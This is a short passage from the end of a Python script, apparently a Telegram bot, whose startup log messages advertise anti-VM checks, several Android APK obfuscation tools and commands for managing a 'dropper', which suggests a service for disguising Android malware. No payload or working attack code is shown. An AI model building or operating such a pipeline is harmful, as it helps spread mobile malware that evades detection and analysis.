    logger.info("[+] 7 Phases: Anti-VM + Obfuscapk + NP Manager(15) + MT Manager(8) + APKTool M")
    logger.info("[+] Dropper management: /setdropper /showdropper")
    logger.info("[+] Tool management: /settools")
    logger.info("[+] Queue: sequential (one file at a time)")

    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
